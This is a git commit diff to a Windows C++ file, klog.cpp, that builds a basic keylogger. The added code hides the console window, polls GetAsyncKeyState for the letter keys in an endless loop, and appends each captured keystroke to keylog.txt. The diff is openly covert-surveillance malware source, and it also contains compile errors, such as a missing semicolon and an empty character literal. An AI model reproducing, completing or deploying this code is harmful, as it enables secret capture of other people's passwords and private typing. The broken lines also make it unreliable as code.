bb6213e4d1c369f58bec80c1517d0688ce941ee6
blahoo <117117475+blahoo@users.noreply.github.com>
2023-10-02 21:19:27 -0400

    basic function

--- klog.cpp
+++ klog.cpp
@@ -2,48 +2,62 @@
 #include <fstream>
 #include <windows.h>
 
+bool key_state[256] = {false}; // array to track key states
+char key_char = '';
+
+void hideConsole(){
+    // get the console window handle
+    HWND consoleWindow = GetConsoleWindow(); 
+
+    // check if console window handle retrieved
+    if (consoleWindow != NULL) {
+        ShowWindow(consoleWindow, SW_HIDE); // hide console
+    }else{ exit(1); }
+}
 
 int main(){
 
-    // Get the console window handle
-    HWND consoleWindow = GetConsoleWindow(); 
+    hideConsole()
 
-    // Check if console window handle retrieved
-    if (consoleWindow != NULL) {
+    std::ofstream keylog("keylog.txt", std::ios::app); // open or create a text file in append mode
 
-        // Hide the console window
-        ShowWindow(consoleWindow, SW_HIDE);
+    // if the file didn't open, shut the program down
+    if (!keylog.is_open()){
+        return 1;
+    }
 
-        // open or create a text file in append mode
-        std::ofstream keylog("log.txt", std::ios::app);
+    // loop to continuously track key inputs
+    while (true) {
 
-        // if the file didn't open, shut the program down
-        if (!keylog.is_open()){
-            return 1;
+        // check each key
+        for (int key = 65; key <= 90; key++) {
+
+            // check if key pressed
+            if (GetAsyncKeyState(key) == -32767 ) {
+                
+                // Check if the key was not already registered as pressed
+                if (!key_state[key]) {
+
+                    key_char = MapVirtualKey(key, 2); 
+                    
+                    keylog << key_char;
+                    keylog.flush(); // flush the output to the file
+
+                    std::cout << key_char << std::endl;
+
+                    key_state[key] = true;
+                }
+            } else {
+                // update the key state if not pressed
+                key_state[key] = false;
+            }   
         }
-
-    
-
-
-
-
-            
-
-        // Add a delay to avoid high CPU usage (you can adjust this)
+        // Add a delay to avoid high CPU usage
         Sleep(100);
-        
+    } 
 
-
-
-        keylog << "hello world";
-
-
-        std::cout << "hello world";
-
-
-
-        keylog.close();
-    }else{ return 1; }
+    keylog.close();
+   
 
     return 0;
 }
